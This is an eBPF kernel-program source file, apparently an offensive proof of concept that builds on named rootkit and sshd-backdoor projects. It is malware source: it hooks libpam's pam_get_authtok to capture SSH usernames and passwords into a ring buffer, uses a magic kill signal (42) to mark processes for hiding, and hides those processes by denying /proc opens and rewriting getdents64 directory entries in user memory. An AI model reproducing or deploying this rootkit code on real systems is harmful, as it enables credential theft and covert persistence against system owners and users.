/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/errno.h>

// references:
// https://github.com/pathtofile/bad-bpf/tree/main
// https://github.com/Esonhugh/sshd_backdoor/tree/Skyworship
// https://github.com/bfengj/eBPFeXPLOIT
extern int bpf_strstr(const char *s1__ign, const char *s2__ign) __ksym __weak;
#include "event.h"
#include "hide.h"
#include "sshBackdoor.h"
#include "utils.h"
// SEC("uprobe/pam_get_authtok")
SEC("uprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KPROBE(AuthtokEnter, struct pam_handle *pamh, int item,
               const char **authtok, const char *promt) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  bpf_printk("new PAM connection! %d\n", pid);
  bpf_map_update_elem(&pamHandleMap, &pid, &pamh, BPF_ANY);
  bpf_map_update_elem(&authtokMap, &pid, &authtok,
                      BPF_ANY); // start tracking pam

  return 0;
}
struct openat_args {
  const char *filename;
};

SEC("uretprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KRETPROBE(AuthtokExist, int ret) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  pam_handle_t **pamHandlePtr = bpf_map_lookup_elem(&pamHandleMap, &pid);
  if (pamHandlePtr == 0)
    return 0;
  char ***authtokPtr = bpf_map_lookup_elem(&authtokMap, &pid);
  if (authtokPtr == 0)
    return 0;
  struct pam_handle *pamh = NULL;
  char **authtok = NULL;
  pamh = *pamHandlePtr;
  authtok = *authtokPtr;
  if (pamh == NULL || authtok == NULL)
    return 0;
  char *userPtr = NULL;
  char *passPtr = NULL;
  struct sshUserPass *sshUserPass;
  sshUserPass = bpf_ringbuf_reserve(&rb, sizeof(*sshUserPass), 0);
  if (!sshUserPass) {
    bpf_map_delete_elem(&pamHandleMap, &pid);
    bpf_map_delete_elem(&authtokMap, &pid);
    return 0;
  }
  sshUserPass->type = 2;
  bpf_probe_read_user(&userPtr, sizeof(userPtr), &pamh->user);
  bpf_probe_read_user_str(&sshUserPass->username, MAX_USERNAME_LEN, userPtr);
  bpf_probe_read_user(&passPtr, sizeof(passPtr), authtok);
  bpf_probe_read_user_str(&sshUserPass->password, MAX_PASSWORD_LEN, passPtr);
  bpf_ringbuf_submit(sshUserPass, 0);
  bpf_map_delete_elem(&pamHandleMap, &pid);
  bpf_map_delete_elem(&authtokMap, &pid);
  bpf_printk("captured credentials!\n");
  return 0;
}
struct process_event {
  __u32 pid;
  char comm[TASK_COMM_LEN];
};

///////////////////
#define MAX_PIDS_TO_HIDE 20
struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, MAX_PIDS_TO_HIDE);
  __type(key, __u32);
  __type(value, pid_t);
} pidToHideMap SEC(".maps");
__u32 index_pids = 0;
#define MAGIC 42

SEC("lsm/task_kill") // temporary for POC
int BPF_PROG(avoidKill, struct task_struct *p, struct kernel_siginfo *info,
             int sig, const struct cred *cred) {
  if (sig == MAGIC) {
    pid_t target_pid = BPF_CORE_READ(p, tgid);
    bpf_map_update_elem(&pidToHideMap, &index_pids, &target_pid, BPF_ANY);
    index_pids++;
    bpf_printk("magic!!!\n");
    return -EPERM;
  }
  return 0;
}

SEC("lsm/file_open")
int BPF_PROG(openFile, struct file *file) {
  pid_t *value;

  char filename[256];
  bpf_d_path(&file->f_path, filename, sizeof(filename));
  bpf_printk("opening file: %s\n", filename);

  int i;
  bpf_for(i, 0, MAX_PIDS_TO_HIDE) {
    pid_t *pid = bpf_map_lookup_elem(&pidToHideMap, &i);
    bpf_printk("pid: %d", pid);
    if (!pid || *pid == 0) {
      continue;
    }
    char pid_str[64];
    BPF_SNPRINTF(pid_str, sizeof(pid_str), "/proc/%d", pid);
    bpf_printk("pid file: %s", pid_str);
    if (bpf_strstr(filename, pid_str) == 0) {
      return -ENOENT;
    }
  }

  return 0;
}

// SEC("tp/sched/sched_process_exec")
// int handle_exec(struct trace_event_raw_sched_process_exec *ctx) {
//   struct process_event evt = {};
//
//   struct task_struct *task;
//   pid_t pid = bpf_get_current_pid_tgid() >> 32;
//   task = (struct task_struct *)bpf_get_current_task();
//   evt.pid = pid;
////  if (HIDEMEPROCPID != 0) {
////    return 0;
////  }
//  bpf_get_current_comm(&evt.comm, sizeof(evt.comm));
//  if (__builtin_memcmp(evt.comm, HIDEPROCNAME, MAX_PATH_LEN)) {
//    bpf_printk("Found choco on %d!\n", pid);
////    HIDEMEPROCPID = pid;
//    char pid_str[MAX_PID_LEN];
//    pid_to_string(pid, pid_str, sizeof(pid_str));
//    int len = MAX_PID_LEN;
// #pragma unroll
//    for (int j = 0; j < len; j++) {
//      pidToHide[0][j] = (u8)pid_str[j];
//    }
//    pidToHide[0][len] = '\0';
//    pidNum = 1;
//  }
//  return 0;
//}

// SEC("tp/sched/sched_process_exit")
// int handle_exec_exit(struct trace_event_raw_sched_process_template *ctx) {
//   pid_t pid = bpf_get_current_pid_tgid() >> 32;
//   if (pid == HIDEMEPROCPID && HIDEMEPROCPID != 0) {
//     HIDEMEPROCPID = 0;
//   }
//   return 0;
// }

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  if (pid == 0) {
    return 0;
  }
  unsigned int fd = ctx->args[0];         // file descriptor
  unsigned int buff_count = ctx->args[2]; // buffer count
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
  bpf_map_update_elem(&bufMap, &pid, &dirp, BPF_ANY);
  u32 zero = 0;
  bpf_map_update_elem(&pidIndexMap, &pid, &zero, BPF_ANY);

  return 0;
}
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
  pid_t pid_tgid = bpf_get_current_pid_tgid() >> 32;

  int total_bytes_read = ctx->ret;
  if (total_bytes_read <= 0) {
    return 0; // not done reading.
  }
  long unsigned int *pbuff_addr = bpf_map_lookup_elem(&bufMap, &pid_tgid);
  if (pbuff_addr == 0) {
    return 0;
  }

  long unsigned int buff_addr = *pbuff_addr;
  struct linux_dirent64 *dirp = 0;
  // int pid = pid_tgid >> 32;
  short unsigned int d_reclen = 0;
  char filename[MAX_PID_LEN];

  unsigned int bpos = 0;

  unsigned int *pBPOS = bpf_map_lookup_elem(&bytesReadMap, &pid_tgid);
  if (pBPOS != 0) {
    bpos = *pBPOS;
  }

  u32 pidIndex = 0;
  u32 *pidIndexPtr = bpf_map_lookup_elem(&pidIndexMap, &pid_tgid);
  if (pidIndexPtr == NULL) {
    bpf_printk("pidIndexPtr is null\n");
    return 0;
  }
  pidIndex = *pidIndexPtr;
  if (pidIndex >= MAX_PID_NUM || pidIndex > pidNum) {
    bpf_printk("pidIndex is out of range,pidIndex:%d\n", pidIndex);
    return 0;
  }
  for (int i = 0; i < 50; i++) {
    if (bpos >= total_bytes_read) {
      break;
    }
    dirp = (struct linux_dirent64 *)(buff_addr + bpos);
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
    // bpf_probe_read_user_str(&filename, pidToHideLen, dirp->d_name);
    // bpf_printk("[PID_HIDE] filename:%s",filename);
    // bpf_core_read_user_str(&filename, pidToHideLen, dirp->d_name);
    BPF_CORE_READ_USER_STR_INTO(&filename, dirp, d_name);
    // bpf_printk("%s",filename);

    int j = 0;
    // verify :j<MAX_PID_LEN
    if (pidIndex >= MAX_PID_NUM || pidIndex > pidNum) {
      bpf_printk("pidIndex is out of range,pidIndex:%d\n", pidIndex);
      return 0;
    }

    for (j = 0; j < MAX_PID_LEN && j < pidToHideLen[pidIndex]; j++) {
      if (filename[j] != pidToHide[pidIndex][j]) {
        break;
      }
    }

    if (j == pidToHideLen[pidIndex]) {
      //?
      // bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
      //?
      // bpf_map_delete_elem(&map_buffs, &pid_tgid);
      long unsigned int *pbuff_addr_prev =
          bpf_map_lookup_elem(&patchMap, &pid_tgid);
      if (pbuff_addr_prev == 0) {
        return 0;
      }

      u64 buff_addr_prev = *pbuff_addr_prev;
      struct linux_dirent64 *dirp_previous =
          (struct linux_dirent64 *)buff_addr_prev;
      u32 d_reclen_previous = 0;
      bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous),
                          &dirp_previous->d_reclen);

      char filename_prev[MAX_PID_LEN];
      // bpf_probe_read_user_str(&filename_prev, pidToHideLen[pidIndex],
      // dirp_previous->d_name);
      bpf_probe_read_user_str(&filename_prev, MAX_PID_LEN,
                              dirp_previous->d_name);

      // Attempt to overwrite
      u32 d_reclen_new = d_reclen_previous + d_reclen;
      long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new,
                                      sizeof(d_reclen_new));

      // Send an event
      struct event *e;
      e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
      if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        e->type = 0;
        bpf_ringbuf_submit(e, 0);
      }

      bpf_map_delete_elem(&patchMap, &pid_tgid);
      pidIndex = pidIndex + 1;
      if (pidNum == pidIndex) {
        goto clean;
      }
    }
    bpf_map_update_elem(&patchMap, &pid_tgid, &dirp, BPF_ANY);
    bpos += d_reclen;
  }

  if (bpos < total_bytes_read) {
    bpf_map_update_elem(&bytesReadMap, &pid_tgid, &bpos, BPF_ANY);
    bpf_map_update_elem(&pidIndexMap, &pid_tgid, &pidIndex, BPF_ANY);
    bpf_tail_call(ctx, &progArrayMap, PROG_01);
  }
clean:
  bpf_map_delete_elem(&bytesReadMap, &pid_tgid);
  bpf_map_delete_elem(&bufMap, &pid_tgid);
  bpf_map_delete_elem(&patchMap, &pid_tgid);
  bpf_map_delete_elem(&pidIndexMap, &pid_tgid);
  return 0;
}

// SEC("tracepoint/syscalls/sys_enter_openat")
// int hideME(struct trace_event_raw_sys_enter *ctx) {
//
//   pid_t pid = bpf_get_current_pid_tgid() >> 32;
//
//   if (HIDEMEPROCPID == 0 || pid == HIDEMEPROCPID) {
//     return 0;
//   }
//
//   char filename[64] = {};
//   const char *filename_ptr = (const char *)ctx->args[1];
//   bpf_probe_read_user_str(filename, sizeof(filename), filename_ptr);
//
//   char target[64] = {};
//   __u64 hidden = (__u64)HIDEMEPROCPID;
//   bpf_snprintf(target, sizeof(target), "/proc/%d", &hidden, sizeof(hidden));
//
//   // bpf_printk("%s\n", filename);
//   // bpf_printk("%s\n", target);
//   if (__builtin_memcmp(filename, target, sizeof(target)) == 0) {
//     bpf_printk("%s\n", filename);
//     return -ENOENT;
//   }
//
//   return 0;
// }

char LICENSE[] SEC("license") = "GPL";
